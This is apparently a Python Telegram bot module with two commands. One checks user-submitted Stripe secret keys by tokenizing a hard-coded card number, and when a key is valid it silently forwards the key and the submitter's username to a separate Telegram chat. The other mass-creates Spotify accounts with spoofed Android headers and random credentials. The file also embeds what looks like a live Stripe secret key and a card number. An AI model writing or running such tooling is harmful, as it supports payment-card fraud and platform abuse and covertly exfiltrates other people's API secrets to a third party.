from aiogram import types
import requests, random, string
from loader import dp, bot
from data.config import PREFIX


@dp.message_handler(commands=['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'], commands_prefix=PREFIX)
async def sh1(message: types.Message):

  user = message.text[len('/sk '):]
  data = 'card[number]=4512238502012742&card[exp_month]=12&card[exp_year]=2023&card[cvc]=354'
  first = requests.post('https://api.stripe.com/v1/tokens',
                        data=data,
                        auth=(user, ' '))
  status = first.status_code
  if status == 200:
    await bot.send_message(chat_id="-1001829546076",
                           text=f"@{message.from_user.username}  \n {user}")
    r_text = 'VALID API KEY ✅'
  else:
    if 'error' in first.json():
      if 'code' in first.json()['error']:
        r_res = first.json()['error']['code'].replace('_', ' ').strip()
      else:
        r_res = 'INVALID API KEY'
    else:
      r_res = 'INVALID API KEY'

    r_text = '❌' + r_res
  await message.answer(f""" 
{r_text} - <code>{user}</code>

<b>Checked by</b> -» <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
<b>Bot by </b> -» <a href="tg://user?id=5234223466"><b>srfxdz</b></a>
          """)


def getRandomString(length):
  pool = string.ascii_lowercase + string.digits
  return "".join(random.choice(pool) for i in range(length))


def getRandomText(length):
  return "".join(random.choice(string.ascii_lowercase) for i in range(length))


def generate():
  nick = getRandomText(8)
  passw = getRandomString(12)
  email = nick + "@" + "gmail" + ".com"

  headers = {
    "Accept-Encoding": "gzip",
    "Accept-Language": "en-US",
    "App-Platform": "Android",
    "Connection": "Keep-Alive",
    "Content-Type": "application/x-www-form-urlencoded",
    "Host": "spclient.wg.spotify.com",
    "User-Agent": "Spotify/8.6.72 Android/29 (SM-N976N)",
    "Spotify-App-Version": "8.6.72",
    "X-Client-Id": getRandomString(32)
  }

  payload = {
    "creation_point": "client_mobile",
    "gender": "male" if random.randint(0, 1) else "female",
    "birth_year": random.randint(1990, 2000),
    "displayname": nick,
    "iagree": "true",
    "birth_month": random.randint(1, 11),
    "password_repeat": passw,
    "password": passw,
    "key": "142b583129b2df829de3656f9eb484e6",
    "platform": "Android-ARM",
    "email": email,
    "birth_day": random.randint(1, 20)
  }

  r = requests.post(
    'https://spclient.wg.spotify.com/signup/public/v1/account/',
    headers=headers,
    data=payload)

  if r.status_code == 200:
    if r.json()['status'] == 1:
      text = f"""
Auto Spotify Created! ✅
🍏 Premium-»  khud jake LELE 
🍏 Email-» <b>{email}</b>
🍏 Password-»<code>{passw}</code>"""

      return (text)
    else:
      #Details available in r.json()["errors"]
      #print(r.json()["errors"])
      return (False, "Could not create the account, some errors occurred")
  else:
    return (False,
            "Could not load the page. Response code: " + str(r.status_code))


@dp.message_handler(commands=['spotify'], commands_prefix=PREFIX)
async def ch(message: types.Message):
  return await message.reply(generate())
